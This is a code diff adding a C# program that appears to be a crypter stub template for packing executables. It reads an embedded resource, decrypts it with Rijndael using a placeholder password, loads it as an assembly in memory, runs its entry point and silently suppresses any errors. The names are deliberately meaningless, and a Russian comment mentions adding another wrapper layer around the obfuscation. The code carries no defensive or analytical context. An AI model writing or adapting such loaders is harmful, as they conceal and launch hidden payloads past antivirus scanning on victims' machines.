@@ -1,0 +1,53 @@
+using System;
+using System.IO;
+using System.Security.Cryptography;
+
+namespace s1
+{
+    class Program
+    {
+        // Дабы крипторы не жаловались на обфускацию, обернем в еще одну оболочку
+        static void Main(string[] args)
+        {
+            try
+            {
+                System.Reflection.Assembly.Load(s3(s7(), s4("[rsname]"))).EntryPoint.Invoke(null, null);
+
+            }
+            catch
+            {
+            }
+
+
+        }
+
+        static string s7()
+        {
+            return "[rspwd]";
+        }
+
+        static byte[] s4(string sdfge)
+        {
+            System.Reflection.Assembly s5 = System.Reflection.Assembly.GetExecutingAssembly();
+            using (System.IO.Stream s7 = s5.GetManifestResourceStream(sdfge))
+            {
+                byte[] s6 = new byte[s7.Length];
+                s7.Read(s6, 0, s6.Length);
+                return s6;
+            }
+        }
+
+        public static byte[] s3(string p2, byte[] p1)
+        {
+            SymmetricAlgorithm symmetricAlgorithm = Rijndael.Create();
+            ICryptoTransform transform = symmetricAlgorithm.CreateDecryptor(new PasswordDeriveBytes(p2, null).GetBytes(16), new byte[16]);
+            MemoryStream memoryStream = new MemoryStream();
+            CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
+            cryptoStream.Write(p1, 0, p1.Length);
+            cryptoStream.FlushFinalBlock();
+
+            return memoryStream.ToArray();
+        }
+        
+    }
+}
